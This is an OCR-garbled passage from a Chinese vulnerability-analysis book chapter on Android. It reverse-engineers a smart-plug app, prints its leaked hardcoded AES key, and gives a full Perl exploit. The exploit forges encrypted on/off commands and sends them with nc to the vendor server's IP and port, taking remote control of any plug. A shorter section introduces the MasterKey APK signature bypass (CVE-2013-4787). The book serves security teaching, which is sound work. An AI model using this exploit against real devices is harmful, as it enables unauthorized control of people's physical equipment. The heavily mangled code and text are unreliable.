P1554T4I711
启动另一Activity
oBseiscrenlliete
nisto
alectiicFepupkindn
图10-40LoadingActivity的Java反编译代码
v161
retsrs:
1_&41
图10-41run函数对传送命令进行加密处理
双击“jnic”可以找到它的定义代码，发现它是个WifiJniC对象：
wifi3niC jnic;
---
## Page 514
第10章Android平台漏洞分析495
双击“WifJniC”可直接查看它的反编译代码，发现它主要用于加载libNDK_03.so链接库（如
图10-42所示），其中的encode与decode就是负责实现命令的加解密。
package hangzhou kankunj
"起K_03*;
peblie Yiri2nic(1 1
r(}zsdns
peblke satire int ads (ist argl, Lnt arg2) (
ithod(stcing argi) (
图10-42WifiJniC类定义
用IDA加载APK包中的 libNDK_03.s0
（如图10-43所示），找到encode对应的函数
java_hangzhou_ kankun_WifiJniC_encode, 这
些从函数名看都很好定位，如果有ARM版的
F5插件则可以更方便地得到函数对应的C代
码，如图10-44所示。
图10-43APK包中的libNDK_03.so链接库
 re
1 // r1
18; // [sp-b] [tp-10nj91
ftre(o7))
图10-44Java_hangzhou_kankun_WifijniC_encode函数
---
## Page 515
496漏洞战争：软件漏洞分析精要
其中的EncryptData就是真正用于加密的函数，它主要使用256位AES加密发送包数据，KEY值为
字符串“fdsl;mewrjope456fds4fbvfnjwaugfo，循环对每16字节进行加密，不足16位的用x00填充，
如图10-45所示。
65
maset(gucotutaut.a,8,soutgutsize)1
y - Bx6C736456:
-)Bc8erg[12]
*_IVORO
*(_I/0R9
)6s2ry[26]e66766266]
// Ms密密铁
x19 -_21a
12A .
//增3环处理每14字节
if ( v16 > # )
*(_DuoRp =]lszbat+[a] *
- [cs]gg(-
3
5
nile ( v1t +- 9t6 )1
图10-45明文密钥泄露
正是由于AES密钥的泄露，我们才能对发送的操作指令任意进行加解密，同时服务端也没有校
验指令发送方的合法性，导致可以任意地运程控制智能插座的开关，笔者通过WireShark抓取发送指
令的加密包，然后用上面得到的AES密钥进行解密，从面得到操作指令内容。
笔者用Perl实现解密过程，具体代码如下：
onexusp9sdoausp。 = Aaxs 
my $cipher = new Crypt: :OpenSSL: :AES($key) ;
操作指令解密函数
sub decrypt(
ny $decrypt_str = "";
my $data = s_[θ];
$data = pack('H*',Sdata);
#将hex转换成字符申
---
## Page 516
第10章Android平台漏洞分析497
my $len = length($data);
#print"解密长度：".$len."\n°;
my Sv7 - $1en / 16;
my $v8 = @;
 = 6As 人u
do(
my $str_16 = substr($data, $v8, 16);
$decrypt_str ,= Scipher->decrypt($str_16);
$v8 += 16;
++$v9;
}whi1e ($v7 > $v9);
return $decrypt_str;
比如开启插座的操作命令（关闭插座的命令类似），要完成以下步骤：
（1）发送开启指令，其内容格式如下：
“wan_phonex”+mac地址+“%nopassword&”+命令（open/close等）+“%request”
（2）服务端返回5位随机数，接着拿此随机数构造确认指令，发送给服务端，内容格式如下：
“wan_phone%”+mac 地址+“%nopassword%”+“confirm”+随机数+“%request”
10.4.3利用漏洞控制网络上的任意插座
有了前面的逆向分析，获取到AES密钥之后，我们就可以任意发送操作指令，比如开启插座、
关闭插座、定时、开启Wi-Fi中继等其他该插座提供的所有功能。完整的漏洞利用代码如下：
#1/usr/bin/ per1
#作者：rlusksk
日期：2014年8月13日
描述：实现某智能插座的远程控制
use utf8;
use Cwd;
use Getopt::Long;
use IO::Socket::INET;
use Crypt::OpenSSL::AES;
---
## Page 517
498漏洞战争：软件漏洞分析精要
binmode(STDoUT,*:utf8′);
my ($mac, $fun, $help);
Getoptions(
‘f=s′=>\sfun,
ews\decrypt($str_16);
$v8 += 16;
6A$++
}whi1e ($v7 > $v9);
return Sdecrypt_str;
操作指令加密函数
sub encrypt[
my $v16;
 = s A
my $data -s_[e];
my $len = length($data);
#print “len=",$len."\n°;
#长度非16的倍数时
if($len & @xF){
my $v8 = ($1en >> ex1F) >> @x1C;
my Sv1e = $len + Sv8;
my $v11 = $len + ex1θ - (($v1e & θxF) - $v8);
if($v11 > 128){
print"字符串长度过大\n"；
exit;
$v16 = ($v10 >> 4) + 1;
#print *v16 = $v16\n°;
#长度为16的倍数时
else(
if($1en >128){
print（“字符串长度过大\n"）;
exit;
$v16 = $1en / 16;
---
## Page 519
500漏洞战争：软件漏洞分析精要
}
my $v12 = @;
@ = 6Ag Ku
if（$v16>e){
do{
my $str_16 = substr($data, $v12, 16);
#print “明文：$str_16\n”;
my $num = 16 - 1ength($str_16);
1f($num > θ){
$str_16 .="\x0e" × $num;
#不足16位的用exee填充
$encrypt_str .= $cipher->encrypt($str_16);
#print “加密：$encrypt_str\n°;
$v12 += 16;
65++
whi1e ($v9 1= $v16);
return Sencrypt_str;
发送开启命令
my $plaintext1 = "wan_phone%" .1c($mac) .“%nopassword%" .$fun.*%request”;
print"[*]发送指令：$plaintext1\n";
my $encrypted = &encrypt($plaintext1);
（
print FD $encrypted;
1f(@ =s fork()){
‘nc -u 115.29.14.58 45398  rep1²;
exit;
s1eep(2);
my $cwd - getcwd();
open（FILE1，“$cwd/rep1”）or die“文件打开失败！\n";
my $cmd1;
my $filestr1;
foreach $filestr1 (){
---
## Page 520
第10章Android平台漏润分析501
$cmd1 ,= unpack(*H**,$filestr1);
};
#print $cnd1."\n";
my $decrypt_data =&decrypt($cmd1);
print"[*]响应数据：“.$decrypt_data."\n”；
从响应数据中获取分配的ID值
my @id1 -split("#",$decrypt_data);
my @1d2 =split（x",$id1[1]);
my $id - $id2[e];
_U\pT$=PT_U
my $plaintext2-“wan_phone%".1c（Smac)."%nopassword%confirm#".sid."%request”;
print"[*]发送指令：$plaintext2\n”;
my $encrypted-&encrypt(Splaintext2）;
print FD Sencrypted;
发送确认指令
if(e == fork(））（
nc-u 115.29.14.58 45398rep2²;
exit;
}
sleep(1);
（
my $filestr2;
my $cmd2;
foreach $filestr2 （）{
$cmd2 .= unpack(H**,$f11estr2);
my $decrypt_data2=&decrypt($cmd2);
if（（index（$decrypt_data2,"open°）>e）11（index（Sdecrypt_data2,“close”)>θ））{
print“[]操作成功！\n”;
else{
print“[*] 操作失败！\n;
---
## Page 521
502漏洞战争：软件漏洞分析精要
运行效果如图10-46所示
tunes/Racist
助络
0:15
158:56100535009
0b:15:
115
图10-46某智能插座漏润利用工具kPlugExp
10.4.4总结
本节以智能设备的Android应用漏润为例，讲解了Android应用中的Java层与C/C++层的逆向分析
技巧，同时也从Android应用延伸到智能设备漏洞上，这也进一步反映出手机平台上的漏洞将间接影
响到未来的物联网，使得原有的虚拟世界能够影响到真实物理世界，未来它的漏洞危害也可能被扩
大化
10.5CVE-2013-4787Android系统签名漏洞
10.5.1漏洞描述
2013年7月初，国外著名安全公司Bluebox对外曝光Android存在严重的安全漏洞，99%的Android
设备均受影响，攻击者可在不破解加密签名的前提下修改合规APK包的代码，使得在安装重打包后
的恶意软件不会被用户察觉到，从而执行特定的恶意操作。Bluebox公司的漏洞发现者已在BlackHat
2013USA大会上分享了关于该漏洞的细节，主要间题在于解析ZIP压缩包中同名文件时存在问题，而
非Android签名机制本身的问题，但利用漏洞可以绕过签名验证。Android系统共被曝光了3个签名漏
洞，本节讲解的是第1个签名漏洞，也叫MasterKey漏洞。
---
## Page 522
第10章Android平台漏润分析503
10.5.2Android签名机制
在分析漏洞前，先来看下Android系统自身的签名验证机制。正常情况下，签名后的APK包会在
/META-INF目录下生成以下3个文件：CERT.RSA（也可能是DSA或EC后缓名）、CERT.SF和
MANIFEST.MF，如图1047所示。
ota.280
tatt
图10-47APK包中的签名文件
MANIFEST.MF：保存除META-INF文件以外其他各文件的SHA-1+base64编码后的值，如图
10-48所示。
/Down1oads /HwVP1ayer /METAIINF
Manifest-Version:1.0
5-
nore MANETEST.M
Created-Dy:1.o (Agro1c)
ne:res/layout/cs_fard
SHA1 Dicest:37AM(0i1690FEMC2nS/U
05/g:
10.
SHA1Digest:t4Y02SNcBA05J06x0v8uTD62
图10-48MANIFEST.MF文件
CERT.SF：在SHA1-Digest-Manifest中保存MANIFEST.MF文件的SHA-1+base64编码后的值，在
后面的各项SHA1-Digest中保存MANIFEST.MF各子项内容SHA-1+Base64编码后的值，如图10-49
所示，
---
## Page 523
504漏洞战争：软件漏洞分析精要
图10-49CERT.SF文件
CERT.RSA/DSA/EC：保存用私钥计算出CERT.SF文件的数字签名、证书发布机构、有效期、
公钥、所有者、签名算法等信息，如图10-50所示。
图10-50CERT.RSA内容